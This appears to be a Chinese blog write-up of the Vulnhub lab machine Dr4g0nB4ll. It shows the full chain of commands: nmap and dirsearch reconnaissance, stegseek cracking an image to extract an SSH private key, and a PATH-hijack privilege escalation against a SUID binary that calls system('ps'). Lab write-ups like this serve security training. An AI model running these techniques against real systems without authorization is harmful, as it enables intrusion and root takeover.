---
title: 'Dr4g0nB4ll - Vulnhub靶机'
date: 2024-02-22 18:00:00 +0800
categories: []
tags: [hack]
---
### 主机发现

```shell
192.168.30.133
```

### 信息收集

```shell
└─$ nmap -sV -A 192.168.30.133
Starting Nmap 7.94 ( https://nmap.org ) at 2024-02-22 03:26 EST
Nmap scan report for 192.168.30.133
Host is up (0.0013s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 b5:77:4c:88:d7:27:54:1c:56:1d:48:d9:a4:1e:28:91 (RSA)
|   256 c6:a8:c8:9e:ed:0d:67:1f:ae:ad:6b:d5:dd:f1:57:a1 (ECDSA)
|_  256 fa:a9:b0:e3:06:2b:92:63:ba:11:2f:94:d6:31:90:b2 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: DRAGON BALL | Aj's
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.56 seconds
```

查看80端口

![image-20240222162800682](../assets/img/old_imgs/image-20240222162800682.png)

浏览发现没有明显信息，同步目录爆破

```shell
PS C:\Users\qianenzhao> dirsearch.exe -u 192.168.30.133:80

  _|. _ _  _  _  _ _|_    v0.4.3.post1
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: C:\Users\qianenzhao\reports\_192.168.30.133_80\_24-02-22_16-23-32.txt

Target: http://192.168.30.133/

[16:23:32] Starting:
[16:23:33] 403 -  279B  - /.ht_wsr.txt
[16:23:33] 403 -  279B  - /.htaccess.bak1
[16:23:33] 403 -  279B  - /.htaccess.sample
[16:23:33] 403 -  279B  - /.htaccess_extra
[16:23:33] 403 -  279B  - /.htaccess.save
[16:23:33] 403 -  279B  - /.htaccess_orig
[16:23:33] 403 -  279B  - /.htaccess_sc
[16:23:33] 403 -  279B  - /.htaccessBAK
[16:23:33] 403 -  279B  - /.htaccessOLD2
[16:23:33] 403 -  279B  - /.htaccess.orig
[16:23:33] 403 -  279B  - /.htaccessOLD
[16:23:33] 403 -  279B  - /.htm
[16:23:33] 403 -  279B  - /.html
[16:23:33] 403 -  279B  - /.htpasswd_test
[16:23:33] 403 -  279B  - /.httr-oauth
[16:23:33] 403 -  279B  - /.htpasswds
[16:23:34] 403 -  279B  - /.php
[16:23:57] 200 -   33B  - /robots.txt
[16:23:57] 403 -  279B  - /server-status/
[16:23:57] 403 -  279B  - /server-status

Task Completed
```

发现存在robots.txt页面

访问得到如下字符`eW91IGZpbmQgdGhlIGhpZGRlbiBkaXI=`

解密得到`you find the hidden dir`

目录爆破无果，审计网站代码

![image-20240222163252652](../assets/img/old_imgs/image-20240222163252652.png)

查找子域名无果，但是发现在末尾注释中存在这样一段字符```VWtaS1FsSXdPVTlKUlVwQ1ZFVjNQUT09```

经过三次`base64`解密得到字符串`DRAGON BALL`

利用这个字符串尝试访问网站目录

![image-20240222163457164](../assets/img/old_imgs/image-20240222163457164.png)

![image-20240222163544001](../assets/img/old_imgs/image-20240222163544001.png)

> secret.txt页面

![image-20240222164314069](../assets/img/old_imgs/image-20240222164314069.png)

无法通过`submit`交互，也无法直接跳转，但是查看源代码可知这个链接打开的图片与先前发现的图片名字一致，尝试下载先前那张图片寻找突破

![image-20240222164859400](../assets/img/old_imgs/image-20240222164859400.png)

常规`binwalk`等尝试无果，尝试使用工具进行爆破

```shell
┌──(kali㉿kali)-[~]
└─$ sudo stegseek ./Desktop/aj.jpg /usr/share/wordlists/rockyou.txt
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "love"
[i] Original filename: "id_rsa".
[i] Extracting to "aj.jpg.out".
```

得到密码，原文件名，打开发现是`ssh密钥`

```shell
┌──(kali㉿kali)-[~/Desktop]
└─$ cat aj.jpg.out
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
...略...
cYmthvUYneQMnt2czKF3XqEvXVPXmnbu9xt079Qu/xTYe+yHZAW5j7gzinVmrQEsvmdejq
9PpqvWzsLFnkXYEMWdKmmHqrauHOcH0hJtEmHuNxR6Zd+XjiRsPuBGxNRE22L/+j++7wxg
uSetwrzhgq3D+2QsZEbjhO+ViDtazKZVjewBCxm7O0NhPFFcfnwTOCDLg+U8Wd1uuVT1lB
Bd8180GtBAAaGtiwAAAAlrYWxpQGthbGk=
-----END OPENSSH PRIVATE KEY-----
```

该机器`ssh`端口已经暴露，尝试利用密钥`ssh`登陆，缺少用户名

回头看发现在登陆页面上有一个疑似用户名的关键词

![image-20240222180928831](../assets/img/old_imgs/image-20240222180928831.png)

搜索发现`xmen`指的是X战警，很有可能就是用户名

###获得立足点

![image-20240222181031980](../assets/img/old_imgs/image-20240222181031980.png)

😘成功得到立足点~

ps这里有个小细节,在利用密钥进行ssh登陆时,会对密钥文件有一个检测,如果该文件开放权限过高会拒绝我们的使用,如下:

![image-20240222181148990](../assets/img/old_imgs/image-20240222181148990.png)

解决办法就是更改该文件的权限:`chmod 600 filename`

### 提权

利用`find`命令查找`suid`提权

```shell
xmen@debian:~$ find / -perm -u=s -type f 2>/dev/null
/home/xmen/script/shell
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/bin/umount
/usr/bin/su
/usr/bin/mount
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/passwd
```

存在一个`shell`看上去就很可疑

```shell
xmen@debian:~/script$ ls
demo.c  shell
```

```c
xmen@debian:~/script$ cat demo.c
#include<unistd.h>
void main()
{ setuid(0);
  setgid(0);
  system("ps");
}
```

甚至直接给出了源码,思路很清晰了,劫持环境变量提权

```shell
xmen@debian:~$ echo '/bin/sh' > /tmp/ps
xmen@debian:~$ chmod 777 /tmp/ps
xmen@debian:~$ export PATH=/tmp:$PATH
xmen@debian:~$ ./script/shell
# whoami
root
# id
uid=0(root) gid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),1000(xmen)
```

```shell
# cd /root
# ls
proof.txt
# cat proof.txt
   _____ __________
  /     \\______   \          ___  ___ _____   ____   ____
 /  \ /  \|       _/          \  \/  //     \_/ __ \ /    \
/    Y    \    |   \           >    <|  Y Y  \  ___/|   |  \
\____|__  /____|_  /__________/__/\_ \__|_|  /\___  >___|  /
        \/       \/_____/_____/     \/     \/     \/     \/

join channel:   https://t.me/joinchat/St01KnXzcGeWMKSC

your flag: 031f7d2d89b9dd2da3396a0d7b7fb3e2
```

👌拿下

last:看到《红队笔记》新一期讲解这个靶机来试试，个人感觉这台靶机就像是`ctf`做题的靶机，没有什么特别的难点疑点，了解常用路数加上`ctf`的一些知识`（misc）`轻松可以拿下haha，话是这么讲但是还是被图片隐写卡住了。



